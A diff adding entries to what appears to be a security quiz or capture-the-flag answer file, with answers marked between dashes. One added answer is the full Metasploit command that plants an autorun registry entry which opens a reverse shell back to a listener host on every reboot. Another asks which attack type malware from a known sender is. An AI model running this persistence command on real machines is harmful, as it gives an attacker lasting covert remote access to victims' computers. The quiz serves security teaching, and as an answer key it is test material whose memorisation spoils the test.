@@ -133,7 +133,21 @@ Process of analyzing and investing computer devices, on suspecting that such dev
 a type of malicious exploit of a website where unauthorized commands are submitted from a user that the web application trusts .
 ---CSRF---
 
-34//
+34//Persistence
+You want to achieve persistence using Meterpreter’s persistence module by creating an autorun registry file and getting a shell automatically every time the user restarts the PC
+Persistence options 
+Your local host IP: 192.168.0.177
+Your Local port: 1337
+Minutes after restarting the system: 7 
+Flag format is the full command used in MSF
+---run persistence -U -i 7 -p 1337 -r 192.168.0.177---
+
+35//Do you trust senders
+Receive malware from a known person. What is the attack type ?
+---spoofing---
+
+
+THE END
 
 
 
